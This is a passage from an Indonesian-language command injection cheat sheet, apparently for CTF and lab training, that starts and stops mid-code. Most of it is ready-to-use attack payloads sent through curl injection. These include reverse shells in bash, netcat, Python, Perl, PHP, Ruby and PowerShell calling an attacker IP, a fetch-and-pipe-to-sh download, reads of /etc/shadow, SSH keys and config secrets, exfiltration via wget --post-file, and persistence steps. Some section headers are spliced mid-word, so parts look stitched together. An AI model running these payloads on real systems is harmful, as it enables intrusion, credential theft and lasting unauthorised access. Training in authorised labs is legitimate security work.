  --data-urlencode 'repo=--upload-pack='\''sh -c "id>&2"'\'' http://github.com/user/repo'
```

### Pattern 4: rsync

```php
// Vulnerable code
$path = $_GET['path'];
system("rsync -av $path /backup/");
```

**Exploit:**

```bash
# Inject -e flag untuk remote shell execution:
curl -G 'http://TARGET/backup' \
  --data-urlencode 'path=-e sh /tmp/payload.sh .'
```

---

## Testing Argument Injection

### Test 1: OOB Detection

```bash
# Test dengan curl argument injection
curl -G 'http://TARGET/test' \
  --data-urlencode 'url=--output /tmp/test http://ATTACKER_IP:8000/marker'

# Check attacker listener:
python3 -m http.server 8000

# Jika menerima connection → vulnerable
```

### Test 2: File Write Detection

```bash
# Test write arbitrary file
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=--output /tmp/argtest http://127.0.0.1/'

# Verify via subsequent read:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=; cat /tmp/argtest'
```

---

## Common Vulnerable Commands

| Command | Dangerous Flags | Impact |
|---|---|---|
| `curl` | `--output`, `-o`, `--upload-file`, `-K` | File write, config read, file upload |
| `wget` | `--output-document`, `-O`, `--post-file` | File write, data exfil |
| `git` | `--upload-pack`, `--receive-pack`, `-c` | RCE via hooks/config |
| `rsync` | `-e`, `--rsh` | RCE via custom shell |
| `tar` | `--to-command`, `--checkpoint-action` | RCE via command execution |
| `convert` (ImageMagick) | `-write`, `-read`, `@-` | Arbitrary file read/write |
| `ffmpeg` | `-i`, `-f concat` | Arbitrary file read (SSRF) |

---

## Mitigation Detection

Argument injection **susah didetect** karena:
- Input tetap "valid" sebagai argument
- Tidak ada separator seperti `;` atau `|`
- Command structure tidak berubah

**Indikasi vulnerable:**
- Command menerima user input tanpa `--` separator
- Tidak ada whitelist strict untuk allowed values
- Input tidak di-quote atau di-escape

---

## Defense: Proper Command Construction

**❌ VULNERABLE:**
```php
system("curl $user_input");
```

**✅ SAFE:**
```php
// Use -- to terminate option processing
system("curl -- " . escapeshellarg($user_input));

// Or whitelist + validate
if (filter_var($user_input, FILTER_VALIDATE_URL)) {
    system("curl -- " . escapeshellarg($user_input));
}
```

---

## Muscle Memory: Argument Injection

```bash
# Pattern 1: curl file write
--output /tmp/test http://attacker/

# Pattern 2: wget file exfil
--post-file=/etc/passwd http://attacker/

# Pattern 3: tar RCE
--checkpoint=1 --checkpoint-action=exec=sh

# Test OOB:
--output /dev/null http://ATTACKER_IP:8000/
```

---

# 💀 4 — Post-Exploitation via Command Injection
---

## Alternative Command

Jika:

```text
cat
```

diblok, gunakan command lain dengan tujuan yang sama pada lab:

```bash
# Read a file through a shell redirection:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=awk "{print}" /etc/passwd'
```

---

### 📌 Kapan Digunakan

Gunakan WAF bypass setelah:

```text
request valid
+
input tertentu konsisten diblok
```

Jangan memperlakukan `403` tunggal sebagai bukti WAF.

---

# 💀 4 — Post-Exploitation via Command Injection

# 4.1 Information Gathering

Setelah command execution dikonfirmasi, jangan langsung reverse shell.

Pertama jawab:

```text
Who am I?
Where am I?
What OS?
What process?
What network?
What privileges?
What credentials?
What interesting files?
```

---

## `id`

```bash
# Show UID, GID and supplementary groups:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=id'
```

Contoh:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Cari:

```text
UID
GID
groups
```

---

## `whoami`

```bash
# Identify the current account:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=whoami'
```

Output:

```text
www-data
```

---

## `hostname`

```bash
# Identify the system hostname:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=hostname'
```

---

## `uname -a`

```bash
# Identify kernel and architecture:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=uname -a'
```

Contoh:

```text
Linux web01 6.1.0-21-amd64 x86_64 GNU/Linux
```

---

## `/etc/passwd`

```bash
# Enumerate local accounts in a lab:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=cat /etc/passwd'
```

Cari:

```text
home directories
service users
interactive users
UID 0
```

---

## `/etc/shadow`

```bash
# Read shadow only when your CTF account legitimately has permission:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=cat /etc/shadow'
```

Possible output:

```text
root:$6$...
```

---

## `ps aux`

```bash
# List running processes:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=ps aux'
```

Cari:

```text
credentials
service paths
custom applications
root-owned services
debug processes
```

---

## `netstat`

```bash
# Enumerate listening TCP/UDP services if net-tools is installed:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=netstat -tulnp'
```

---

## `ip a`

```bash
# Show interfaces and assigned IP addresses:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=ip a'
```

Cari:

```text
eth0
ens3
tun0
docker0
internal subnets
```

---

## `env`

```bash
# Display environment variables:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=env'
```

Cari:

```text
DATABASE_URL
DB_PASSWORD
API_KEY
SECRET
TOKEN
HOME
PATH
```

---

## `printenv`

```bash
# Display environment variables through printenv:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=printenv'
```

---

## SUID

```bash
# Find SUID binaries visible to the current user:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=find / -perm -4000 2>/dev/null'
```

Cari binary tidak biasa:

```text
/usr/bin/find
/usr/bin/vim
/usr/bin/bash
/custom/path/binary
```

---

## `sudo -l`

```bash
# Show sudo permissions for the current account:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=sudo -l'
```

Contoh:

```text
User www-data may run:
    (root) NOPASSWD: /usr/bin/service
```

---

## `/proc/version`

```bash
# Read kernel/compiler information:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=cat /proc/version'
```

---

### 📌 Kapan Digunakan

Lakukan command enumeration ini **segera setelah RCE**.

Urutan:

```text
id
↓
whoami
↓
hostname
↓
uname -a
↓
ip a
↓
ps aux
↓
env
↓
sudo -l
↓
SUID
```

---

# 4.2 File Read via Command Injection

## `/etc/passwd`

```bash
# Read local account information:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=cat /etc/passwd'
```

---

## SSH Private Key

Dalam lab:

```bash
# Read a private key only when explicitly permitted by the challenge:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=cat /home/user/.ssh/id_rsa'
```

Cari:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
```

---

## Web Configuration

```bash
# Inspect a typical PHP configuration file in a lab:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=cat /var/www/html/config.php'
```

Cari:

```text
DB_HOST
DB_USER
DB_PASSWORD
APP_KEY
SECRET
```

---

## Find Configuration Files

```bash
# Find a limited number of .conf files:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=find / -name "*.conf" 2>/dev/null | head -20'
```

---

## Output Terlalu Panjang

Gunakan:

```bash
# Limit output to the first 20 lines:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=cat /etc/passwd | head -20'
```

Atau:

```bash
# Save a local HTTP response for offline inspection:
curl -G -o response.txt \
  'http://TARGET/test' \
  --data-urlencode 'input=cat /etc/passwd'
```

Kemudian:

```bash
# Inspect only the first 50 lines locally:
head -50 response.txt
```

---

### 📌 Kapan Digunakan

Gunakan file read setelah:

```text
RCE confirmed
```

untuk mencari:

```text
credentials
keys
config
users
application source
```

---

# 4.3 Reverse Shell via Command Injection

> Semua payload berikut ditujukan untuk **lab/CTF yang Anda kontrol**.

Mental model:

```text
TARGET
  │
  │ outbound connection
  ▼
ATTACKER
  │
  └── listener
```

---

## Persiapan Variable

Pada attacker:

```bash
# Set your VPN/lab-facing attacker address:
LHOST="10.10.14.5"

# Set the listener port:
LPORT="4444"
```

---

## Listener

```bash
# Start a Netcat listener:
nc -lvnp 4444
```

Atau:

```bash
# Start Netcat through rlwrap for better terminal editing:
rlwrap nc -lvnp 4444
```

---

## Bash TCP

Target payload:

```bash
# Bash TCP reverse shell for an authorized lab:
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

Via curl:

```bash
# URL-encode the complete Bash payload:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; bash -c '\''bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'\'''
```

---

## Bash UDP

⚠️ **CATATAN PENTING:** Bash UDP reverse shells **sangat jarang reliable** di CTF karena:
1. `/dev/udp` hanya tersedia di **bash** (bukan sh/dash/ash)
2. UDP tidak ada connection state — output bisa hilang
3. Sangat jarang dipakai di production CTF
4. **Gunakan TCP (`/dev/tcp`) kecuali ada alasan spesifik memilih UDP**

UDP reverse shells are shell/version dependent.

A common Bash UDP pattern:

```bash
# Bash UDP example untuk lab environment
# Membutuhkan bash (bukan sh)
bash -c 'bash -i >& /dev/udp/10.10.14.5/4444 0>&1'
```

**Listener UDP:**

```bash
# Listener harus UDP mode (note flag -u)
nc -u -lvnp 4444
```

Trigger:

```bash
# Send the UDP-oriented payload:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; bash -c '\''bash -i >& /dev/udp/10.10.14.5/4444 0>&1'\'''
```

> **Recommendation:** Gunakan TCP reverse shell untuk reliability yang lebih baik di CTF.

---

## Netcat Variant 1 — `-e`

Jika netcat mendukung `-e`:

```bash
# Classic Netcat -e variant:
nc 10.10.14.5 4444 -e /bin/bash
```

curl:

```bash
# Trigger the classic Netcat -e payload:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; nc 10.10.14.5 4444 -e /bin/bash'
```

---

## Netcat Variant 2 — Named Pipe

Jika `-e` tidak tersedia:

```bash
# Use a named pipe with Netcat:
rm -f /tmp/p

# Create the FIFO:
mkfifo /tmp/p

# Connect stdin/stdout through Netcat:
cat /tmp/p | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/p
```

curl:

```bash
# Trigger the FIFO-based Netcat shell:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/p'
```

---

## Python3

```bash
# Python 3 reverse shell for a lab:
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

curl:

```bash
# URL-encode the Python 3 payload:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; python3 -c '\''import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'\'''
```

---

## Python2

```bash
# Python 2 reverse shell where Python 2 exists:
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

curl:

```bash
# Trigger the Python 2 payload:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; python -c '\''import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"] )'\'''
```

---

## Perl

```bash
# Perl reverse shell:
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

curl:

```bash
# Trigger the Perl payload:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; perl -e '\''use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'\'''
```

---

## PHP

```bash
# PHP socket-based reverse shell untuk lab
# ⚠️ CATATAN: exec dengan <&3 >&3 2>&3 tidak selalu reliable karena fd 3 
# tidak dijamin merupakan socket descriptor dari fsockopen().
# Gunakan proc_open() atau shell_exec() dengan dynamic socket variable.

# Method 1: proc_open (PALING RELIABLE)
php -r '$sock=fsockopen("10.10.14.5",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# Method 2: shell_exec dengan dynamic socket variable
php -r '$s=fsockopen("10.10.14.5",4444);shell_exec("/bin/sh -i <&".$s." >&".$s." 2>&".$s);'

# Method 3: exec dengan fd 3 (LEGACY / UNRELIABLE)
php -r '$s=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

curl:

```bash
# Trigger PHP reverse shell via proc_open (Method 1):
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; php -r '\''$sock=fsockopen("10.10.14.5",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'\'''

# Alternative dengan Method 2 (shell_exec):
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; php -r '\''$s=fsockopen("10.10.14.5",4444);shell_exec("/bin/sh -i <&".$s." >&".$s." 2>&".$s);'\'''
```

---

## Ruby

```bash
# Ruby TCP reverse shell:
ruby -rsocket -e 'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

curl:

```bash
# Trigger the Ruby payload:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; ruby -rsocket -e '\''f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\'''
```

---

## curl One-Liner

`curl` sendiri bukan shell, tetapi dapat dipakai untuk fetch a remote script in a lab.

Attacker:

```bash
# Serve a lab-only shell script from your attack machine:
python3 -m http.server 8000 --bind 0.0.0.0
```
```

---

# 4.3.1 Shell Stabilization — Setelah Dapat Reverse Shell

Setelah reverse shell diterima di nc listener, shell masih **"dumb terminal"** yang perlu di-stabilize.

## 📌 Kapan Digunakan

Stabilize shell **segera setelah** reverse shell connection established untuk:
- Enable tab completion
- Prevent Ctrl+C dari killing session
- Enable arrow keys navigation
- Allow vim/nano usage
- Get proper terminal behavior

---

## Method 1: Python PTY (PALING UMUM & RELIABLE)

```bash
# Di reverse shell yang baru diterima, jalankan:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Jika python3 tidak ada, coba python atau python2:
python -c 'import pty; pty.spawn("/bin/bash")'

# Sekarang shell sudah sedikit lebih baik, lanjut upgrade:

# Tekan Ctrl+Z untuk background nc listener
# (Shell akan terlihat "stuck" sebentar, ini normal)

# Di terminal attacker kamu, jalankan:
stty raw -echo; fg

# Tekan Enter dua kali
# Shell akan kembali, sekarang full-featured!

# Set terminal environment:
export TERM=xterm
stty rows 50 cols 220

# Optional: set SHELL
export SHELL=/bin/bash
```

---

## Method 2: script Command (Jika Python Tidak Ada)

```bash
# Di reverse shell:
script /dev/null -c bash

# Atau versi pendek:
script /dev/null -qc /bin/bash
```

---

## Method 3: socat (Jika Tersedia di Target)

**Di attacker:**

```bash
# Listener dengan socat (better than nc)
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**Di target (via command injection):**

```bash
# Jika socat tersedia di target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

---

## Verify Shell Stabil

```bash
# Test 1: Tab completion
ls /et[TAB]  
# Harus complete menjadi: /etc/

# Test 2: Ctrl+C (harus TIDAK disconnect)
ping 8.8.8.8
# Tekan Ctrl+C
# Shell harus masih aktif

# Test 3: Check TERM
echo $TERM
# Output seharusnya: xterm

# Test 4: Check tty
tty
# Output seharusnya: /dev/pts/X (bukan "not a tty")

# Test 5: Arrow keys
# Tekan arrow up/down untuk history navigation
# Harus berfungsi tanpa ^[[A atau ^[[B muncul

# Test 6: vim/nano
vim test.txt
# Harus bisa dibuka dan digunakan normal
```

---

## Troubleshooting Shell Stabilization

### Ctrl+Z Tidak Work

```bash
# Pastikan terminal attacker support job control
# Coba gunakan socat atau method 2

# Alternative tanpa Ctrl+Z:
# Di window terminal baru di attacker:
stty raw -echo
# Lalu di window nc: fg
```

### stty raw -echo Error

```bash
# Jalankan tanpa -echo dulu:
stty raw
fg

# Atau split command:
stty -echo
stty raw
fg
```

### Python Tidak Ada

```bash
# Coba python2 atau python:
python -c 'import pty; pty.spawn("/bin/bash")'
python2 -c 'import pty; pty.spawn("/bin/bash")'

# Jika semua python gagal, gunakan method 2:
script /dev/null -c bash
```

### Shell Masih Tidak Stabil

```bash
# Minimal set TERM:
export TERM=xterm

# Atau coba TERM lain:
export TERM=screen
export TERM=linux

# Check terminal size:
stty size
# Output: rows cols

# Manual set jika perlu:
stty rows 50
stty cols 220
```

---

## Muscle Memory: Shell Stabilization

```bash
# ONE-LINER di reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")' && export TERM=xterm

# ONE-LINER di attacker (after Ctrl+Z):
stty raw -echo; fg

# TWO ENTER kemudian:
export TERM=xterm; stty rows 50 cols 220
```

---

# 4.4 Upgrade ke Persistent Accessunches a reverse shell:
cat > shell.sh <<'EOF'
#!/bin/sh
sh -i >& /dev/tcp/10.10.14.5/4444 0>&1
EOF

# Make the script executable locally:
chmod +x shell.sh
```

Trigger:

```bash
# Download and execute the lab script:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; curl http://10.10.14.5:8000/shell.sh | sh'
```

---

## Encoding Special Characters

Untuk payload kompleks, cara paling aman:

```bash
# Let curl perform URL encoding:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=PAYLOAD_HERE'
```

Alternatif:

```bash
# Encode a payload locally for manual insertion into Burp:
python3 -c 'import urllib.parse; print(urllib.parse.quote("127.0.0.1; id"))'
```

Contoh:

```text
127.0.0.1%3B%20id
```

### 📌 Kapan Digunakan

Gunakan reverse shell setelah:

```text
command execution confirmed
```

Urutan:

```text
RCE proof
   ↓
id
   ↓
network check
   ↓
listener
   ↓
reverse shell
```

---

# 4.4 Upgrade ke Persistent Access

> **CTF/lab only.** Persistence tidak boleh dilakukan pada host yang tidak Anda miliki izin eksplisit untuk mengubah.

---

## SSH Key Persistence

Konsep:

```text
attacker public key
       ↓
~/.ssh/authorized_keys
       ↓
SSH login
```

Generate key:

```bash
# Generate a dedicated lab SSH key:
ssh-keygen -t ed25519 -f ./lab_key -N ''
```

Target:

```bash
# Create the SSH directory in the authorized lab account:
mkdir -p ~/.ssh

# Add the attacker's public key:
cat >> ~/.ssh/authorized_keys <<'EOF'
PASTE_YOUR_PUBLIC_KEY_HERE
EOF

# Restrict directory permissions:
chmod 700 ~/.ssh

# Restrict authorized_keys permissions:
chmod 600 ~/.ssh/authorized_keys
```

Login:

```bash
# Use the lab private key:
ssh -i ./lab_key user@TARGET
```

---

## Create User

Lab only:

```bash
# Create a dedicated lab account:
useradd -m ctfuser

# Set a lab password interactively:
passwd ctfuser
```

Check:

```bash
# Verify the account:
id ctfuser
```

---

## Cron Persistence

Lab only:

```bash
# List current cron entries:
crontab -l
```

Add a benign lab marker:

```bash
# Write a harmless periodic marker into /tmp:
( crontab -l 2>/dev/null; echo '* * * * * echo CRON_TEST >> /tmp/cron_test' ) | crontab -
```

Verify:

```bash
# Check whether the cron entry was installed:
crontab -l
```

---

## Web Shell Drop

Dalam lab:

```bash
# Create a minimal lab-only PHP execution marker:
printf '%s\n' '<?php echo "LAB_SHELL_OK"; ?>' > /var/www/html/lab.php
```

Verify:

```bash
# Verify the lab file exists:
ls -l /var/www/html/lab.php
```

### 📌 Kapan Digunakan

Persistence hanya relevan ketika challenge secara eksplisit meminta:

```text
maintain access
post-exploitation
privilege persistence
```

---

# 🐧 5 — Environment Specific

# 5.1 Linux Command Injection

Shell yang mungkin:

```text
bash
sh
dash
zsh
ash
```

---

## Detect Shell

Coba:

```bash
# Check whether the current shell exposes SHELL:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=echo $SHELL'
```

Periksa process:

```bash
# Identify the process ancestry where available:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=ps -o pid,ppid,comm,args -p $$'
```

---

## Behavior Differences

|Shell|Notable Behavior|
|---|---|
|`bash`|Rich shell syntax|
|`sh`|Generic POSIX shell interface|
|`dash`|Minimal POSIX shell|
|`zsh`|Extended shell features|
|`ash`|Common in embedded/BusyBox systems|

---

## Universal Commands

Untuk baseline:

```text
id
whoami
pwd
hostname
uname
printf
echo
```

Contoh:

```bash
# Run a very portable identity check:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=whoami'
```

---

### 📌 Kapan Digunakan

Gunakan shell identification ketika:

```text
payload bash-specific
```

gagal.

---

# 🪟 5.2 Windows Command Injection

Windows biasanya melibatkan:

```text
cmd.exe
PowerShell
```

---

## Separator Windows

Common:

```text
&
&&
|
||
```

Contoh:

```bash
# Execute whoami through Windows command chaining:
curl -G 'http://TARGET/ping' \
  --data-urlencode 'host=127.0.0.1 & whoami'
```

---

## `dir` vs `ls`

Windows:

```text
dir
```

Linux:

```text
ls
```

---

## `type` vs `cat`

Windows:

```text
type C:\Windows\win.ini
```

Linux:

```text
cat /etc/passwd
```

---

## Detect Windows

```bash
# Query the Windows identity command:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=whoami'
```

Contoh:

```text
nt authority\system
```

atau:

```text
WEB01\iis apppool\defaultapppool
```

---

## Windows Environment

```bash
# Display the Windows command interpreter environment:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=echo %COMSPEC%'
```

Expected:

```text
C:\Windows\System32\cmd.exe
```

---

## PowerShell Detection

```bash
# Ask PowerShell for its version:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=powershell -NoProfile -Command "$PSVersionTable.PSVersion"'
```

---

## PowerShell Reverse Shell

Lab-only example:

```bash
# Launch a PowerShell TCP reverse shell in an authorized Windows lab:
powershell -NoP -NonI -W Hidden -Command "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535;while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1 | Out-String);$o=$r+'PS '+(pwd).Path+'> ';$x=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($x,0,$x.Length)}"
```

curl:

```bash
# Trigger the PowerShell reverse shell through the injection point:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1 & powershell -NoP -NonI -W Hidden -Command "$c=New-Object Net.Sockets.TCPClient('\''10.10.14.5'\'',4444);$s=$c.GetStream();[byte[]]$b=0..65535;while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1 | Out-String);$o=$r+'\''PS '\''+(pwd).Path+'\''> '\'';$x=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($x,0,$x.Length)}"'
```

---

### 📌 Kapan Digunakan

Windows path dipilih ketika response mengandung:

```text
C:\
Windows
Microsoft
IIS
cmd.exe
PowerShell
NT AUTHORITY
```

---

# 5.3 Blind Injection di Windows

## Timing via `ping -n`

```bash
# Use five ICMP echo requests to introduce measurable delay:
curl -o /dev/null -s \
  -w 'TIME=%{time_total}\n' \
  -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1 & ping -n 5 127.0.0.1 > NUL'
```

---

## `nslookup` OOB

```bash
# Trigger DNS resolution from the Windows target:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1 & nslookup OOB_DOMAIN'
```

---

## PowerShell OOB

```bash
# Trigger an HTTP callback using PowerShell:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1 & powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing http://OOB_DOMAIN"'
```

### 📌 Kapan Digunakan

Gunakan ketika:

```text
Windows target
+
no visible output
```

---

# 🧰 6 — Tools & Automation

# 6.1 Manual Testing dengan curl

## Basic Template

```bash
# Replace TARGET and the parameter name with the authorized lab endpoint:
curl -G 'http://TARGET/test' \
  --data-urlencode 'param=PAYLOAD'
```

---

## Separator Template

```bash
# Semicolon:
curl -G 'http://TARGET/test' --data-urlencode 'param=value; id'

# Ampersand:
curl -G 'http://TARGET/test' --data-urlencode 'param=value & id'

# Logical AND:
curl -G 'http://TARGET/test' --data-urlencode 'param=value && id'

# Pipe:
curl -G 'http://TARGET/test' --data-urlencode 'param=value | id'

# Logical OR:
curl -G 'http://TARGET/test' --data-urlencode 'param=false || id'
```

---

## URL Encoding

```bash
# Encode a payload locally:
python3 -c 'import urllib.parse; print(urllib.parse.quote("127.0.0.1; id"))'
```

Expected:

```text
127.0.0.1%3B%20id
```

---

## Cookies / Session

```bash
# Use an authenticated session cookie:
curl -G 'http://TARGET/test' \
  -H 'Cookie: PHPSESSID=SESSION_VALUE' \
  --data-urlencode 'host=127.0.0.1; id'
```

---

## Follow Redirect

```bash
# Follow HTTP redirects when the application requires them:
curl -L -G 'http://TARGET/test' \
  --data-urlencode 'host=127.0.0.1; id'
```

---

## Save Response

```bash
# Save headers and body for offline comparison:
curl -i -G \
  -o response.txt \
  'http://TARGET/test' \
  --data-urlencode 'host=127.0.0.1; id'
```

Compare:

```bash
# Compare two captured responses:
diff -u response_normal.txt response_test.txt
```

---

### 📌 Kapan Digunakan

`curl` adalah tool utama untuk:

```text
repeatability
timing measurement
parameter encoding
session testing
automation
```

---

# 6.2 Commix

## Apa Itu Commix?

Commix adalah tool otomatis untuk mendeteksi dan mengeksploitasi command injection.

Mental model:

```text
Manual discovery
      ↓
Manual confirmation
      ↓
Commix automation
```

Jangan menjadikan automation sebagai pengganti pemahaman.

---

## Install

```bash
# Update package metadata:
sudo apt update

# Install commix if available in the Parrot repositories:
sudo apt install commix
```

Jika package tidak tersedia:

```bash
# Clone the upstream repository:
git clone https://github.com/commixproject/commix.git

# Enter the directory:
cd commix
```

---

## Basic Command

```bash
# Test a lab URL parameter:
python3 commix.py \
  -u 'http://TARGET/test?host=127.0.0.1'
```

---

## POST Data

```bash
# Test an injectable POST parameter:
python3 commix.py \
  -u 'http://TARGET/test' \
  --data='host=127.0.0.1'
```

---

## Cookie

```bash
# Pass the authenticated lab session:
python3 commix.py \
  -u 'http://TARGET/test?host=127.0.0.1' \
  --cookie='PHPSESSID=SESSION_VALUE'
```

---

## Output yang Diharapkan

Contoh:

```text
[INFO] Testing connection to the target URL
[INFO] Testing if the parameter 'host' is injectable
[INFO] The parameter 'host' appears to be injectable
[INFO] Type: classic command injection
[INFO] OS: Linux
[INFO] Technique: time-based
```

---

## Commix vs Manual

|Situasi|Manual|Commix|
|---|--:|--:|
|Belajar fundamentals|✅|❌|
|Memahami separator|✅|❌|
|Simple CTF|✅|✅|
|Banyak parameter|⚠️|✅|
|Automation|❌|✅|
|Filter custom|✅|✅|
|Debug behavior|✅|⚠️|

### 📌 Kapan Digunakan

Gunakan Commix:

```text
setelah memahami endpoint
```

bukan sebagai first reflex.

---

# 6.3 Script `cmdinjection_test.sh`

Script ini melakukan:

```text
separator test
        ↓
"id" test
        ↓
sleep test
        ↓
summary
```

Tidak melakukan:

```text
reverse shell
persistence
automatic exfiltration
```

---

## Script

```bash
#!/usr/bin/env bash

# ============================================================
# cmdinjection_test.sh
# Authorized lab / CTF command injection tester
# ============================================================

set -u

usage() {
    cat <<'EOF'
Usage:
  ./cmdinjection_test.sh <URL> <parameter> <separator_file>

Example:
  ./cmdinjection_test.sh \
    "http://10.10.10.50/ping" \
    "host" \
    separators.txt

The separator file must contain one separator per line.

Example separators.txt:
;
&
&&
|
||

This script:
  - validates input
  - tests separator + id
  - looks for uid=
  - performs a sleep timing test
  - prints a summary
  - does NOT launch a reverse shell
  - does NOT perform persistence
EOF
    exit 1
}

# ------------------------------------------------------------
# Argument validation
# ------------------------------------------------------------

if [[ $# -ne 3 ]]; then
    usage
fi

URL="$1"
PARAM="$2"
SEPARATOR_FILE="$3"

# Validate URL scheme.
if [[ "$URL" != http://* && "$URL" != https://* ]]; then
    echo "[!] Invalid URL."
    echo "[!] URL must start with http:// or https://"
    exit 1
fi

# Validate parameter name.
if [[ -z "$PARAM" ]]; then
    echo "[!] Parameter must not be empty."
    exit 1
fi

if [[ ! "$PARAM" =~ ^[A-Za-z0-9_.-]+$ ]]; then
    echo "[!] Invalid parameter name."
    echo "[!] Allowed characters: A-Z a-z 0-9 _ . -"
    exit 1
fi

# Validate separator file.
if [[ ! -f "$SEPARATOR_FILE" ]]; then
    echo "[!] Separator file does not exist."
    exit 1
fi

if [[ ! -r "$SEPARATOR_FILE" ]]; then
    echo "[!] Separator file is not readable."
    exit 1
fi

# Validate dependencies.
if ! command -v curl >/dev/null 2>&1; then
    echo "[!] curl is required."
    exit 1
fi

if ! command -v awk >/dev/null 2>&1; then
    echo "[!] awk is required."
    exit 1
fi

echo
echo "============================================================"
echo " Command Injection Tester"
echo "============================================================"
echo "[!] AUTHORIZED LAB / CTF ONLY"
echo "[*] URL       : $URL"
echo "[*] PARAMETER : $PARAM"
echo "[*] SEPARATORS: $SEPARATOR_FILE"
echo

# ------------------------------------------------------------
# Helper: request a parameter
# ------------------------------------------------------------

request_test() {
    local payload="$1"

    curl -sS \
        --max-time 15 \
        -G "$URL" \
        --data-urlencode "${PARAM}=${payload}"
}

# ------------------------------------------------------------
# Baseline
# ------------------------------------------------------------
echo "[*] Testing sleep-based payload..."

# Note: date +%s%N (nanosecond precision) hanya tersedia di GNU date
# Ini kompatibel dengan Parrot OS / Debian / Ubuntu Linux
